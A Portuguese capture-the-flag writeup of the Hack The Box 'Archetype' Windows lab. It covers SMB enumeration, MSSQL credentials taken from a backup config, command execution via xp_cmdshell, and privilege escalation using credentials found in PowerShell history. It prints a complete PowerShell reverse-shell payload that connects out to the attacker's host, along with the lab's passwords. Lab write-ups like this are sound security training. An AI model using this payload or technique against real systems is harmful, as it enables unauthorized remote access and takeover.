---
title: HTB Archetype Writeup
author: Hastur
date: 2021-09-05 21:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Starting point, Windows, Very Easy, MSSQL]
image: /img/htb/htb-archetype-logo.png
alt: "HTB Archetype Writeup"
---

<img src="/img/htb/htb-archetype-logo.png">

<br>


| Nome | Archetype       |
|------|-------------|
|IP    | 10.10.10.27|
|Pontos| 0          |
|OS    | Windows    |
|Nível | Very Easy  |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Archetype]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.27 --min-rate=512
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-09-05T19:35:06
| Not valid after:  2051-09-05T19:35:06
| MD5:   0f97 d62c 8d46 e595 8b83 982b eb14 769f
|_SHA-1: 795d c811 74ec cd90 80e3 27d6 bb77 796c a2f0 d9d4
|_ssl-date: 2021-09-05T19:47:03+00:00; -35m18s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 48m42s, deviation: 3h07m52s, median: -35m18s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-05T12:46:55-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-05T19:46:54
|_  start_date: N/A


```
Encontramos várias portas abertas nesta máqina, vamo começar pela `445 - SMB`.

### SMB

Vamos tentar uma conex]ao sem credenciais para verificar null session no SMB.

<img src="/img/htb/htb-archetype-1.png">

Temos acesso a algubs compartilhamentos, em expecial `backups`, vamos enumerá-lo.

<img src="/img/htb/htb-archetype-2.png">

Encontramos o arquivo, `prod.dtsConfig`, após baixarmos, e analizarmos, encontramos algumas informaçõs valiosas.

<img src="/img/htb/htb-archetype-3.png">

Ecnontramos as credenciais para um MSSQL: `ARCHETYPE\sql_svc:M3g4c0rp123`.

Em posse das credenciais, podemos tentar uma conex]ao remota utilizando o `mssqlclient.py`.

<img src="/img/htb/htb-archetype-4.png">

Conseguimos um acesso ao MSSQL, ótimo!

Podemos utilizar a função `IS_SRVROLEMEMBER`, para verificar se o usuário `sql_svc` tem privilégios administrativos.

<img src="/img/htb/htb-archetype-5.png">

O MSSQL retornou `1`, o que significa que temos privilégios administrativos.

Agora precisamos de uma forma de conseguir a leak de algum arquivo, ou melhor, um shell.

Existe uma funsão do MSSQL que permite executar comandos via query, podemos encontrar na pŕopria documentação da Microsoft [aqui](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15).

Vamos seguir os passos da documentação e testar algum comando.

<img src="/img/htb/htb-archetype-6.png">

Ótimo, conseguimos um RCE através do MSSQL, agora podemos tentar um reverse shell através de comandos no PowerSHell.

Primeiro vamos criar um payload de uma linha em power shell e salvá-lo no arquivo `shell.ps1`.

```bash
┌──(hastur㉿hastur)-[~/Archetype]
└─$ cat shell.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.251",8443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Agora vamos iniciar um server http com python `python3 -m http.server 80`.

<img src="/img/htb/htb-archetype-7.png">

Agora setamos um `netcat` na porta 8443 que setamos em nosso payload.

<img src="/img/htb/htb-archetype-8.png">

Com tudo pronto, podemos enviar um payload em Power Shell no MSSQL, que vai fazer o download do script em nosso HTTP server e em seguida executá-lo, nos dando um reverse shell no netcat que abrimos.

<img src="/img/htb/htb-archetype-9.png">

Se olharmos em nosso servidor HTTP, podemos ver que houve uma requisição vinda da Archetype.

<img src="/img/htb/htb-archetype-10.png">

E em nosso netcat, temos nosso reverse shell!!!

<img src="/img/htb/htb-archetype-11.png">

Ótimo, estamos dentro do host da Archetype, dentro do Desktop do usuário `sql_svc`, encontramos a flag do usuário.

<img src="/img/htb/htb-archetype-12.png">

## Escalação de privilégios

Após um bom tempo de enumeração local, decidi checar se há algum histórico do Power Shell no usuário e descobri uma informação extremamente importante.

<img src="/img/htb/htb-archetype-13.png">

Encontramos as credenciais do administrador: `administrator:MEGACORP_4dm1n!!`.

Em posse destas credenciais, podemos tentar um acesso remoto ao host utilizando o `psexec.py`.

<img src="/img/htb/htb-archetype-14.png">

E conseguimos nosso shell com privilégios administrativos no Host Archetype.

A flag do Administrator está em seu Desktop.

<img src="/img/htb/htb-archetype-15.png">


E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>



